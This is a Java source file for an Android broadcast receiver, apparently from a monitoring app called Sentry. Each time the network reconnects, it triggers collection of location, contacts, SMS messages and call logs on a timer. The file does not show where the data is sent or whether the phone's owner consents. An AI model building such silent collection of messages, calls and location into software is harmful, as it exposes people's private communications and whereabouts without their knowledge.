package com.ville.sentry;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class NetworkChangedReceiver extends BroadcastReceiver {
	private static final String TAG = "Sentry/NetworkChangedReceiver";
	private static final long TIME_INTEVEL = 1 * 3600 * 1000L;  	  // 1 hour
	private static final long TIME_INTEVEL_LONG = 12 * 3600 * 1000L;  // 12 hour
	private static final SimpleDateFormat DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		boolean isConntected = Utility.isConnected(context);
		AppLog.d(TAG, "[NetworkChangedReceiver.onReceiver] isConntected ? " + isConntected);
		if(!isConntected){
			return;
		}
		SentryApplication app = SentryApplication.getApp();
		Date now = new Date();
		Date temLast = null;
		String str = app.getLocationLastUploadTime();
		try {
			temLast = DATE_FORMAT.parse(str);
		} catch (ParseException e) {
			// TODO Auto-generated catch block
			AppLog.e(TAG, "Error: " + e.getMessage());
			e.printStackTrace();
		}
		if(temLast != null && (now.getTime() - temLast.getTime()) > TIME_INTEVEL){
			AppLog.d(TAG, "[NetworkChangedReceiver.onReceiver] start Location...");
			app.startReqLocation(context);
		}
		
		// contacts
		temLast = new Date(app.getContactLastUpdateTime());
		if((now.getTime() - temLast.getTime()) > TIME_INTEVEL_LONG){
			AppLog.d(TAG, "[NetworkChangedReceiver.onReceiver] start Contact...");
			app.startReqContact(context);
		}
		// sms
		temLast = new Date(app.getSmsLastUpdateTime());
		if((now.getTime() - temLast.getTime()) > TIME_INTEVEL_LONG){
			AppLog.d(TAG, "[NetworkChangedReceiver.onReceiver] start SMS...");
			app.startReqSms(context);
		}
		// call
		temLast = new Date(app.getCallLastUpdateTime());
		if((now.getTime() - temLast.getTime()) > TIME_INTEVEL_LONG){
			AppLog.d(TAG, "[NetworkChangedReceiver.onReceiver] start Call...");
			app.startReqCallLog(context);
		}
		
	}
}
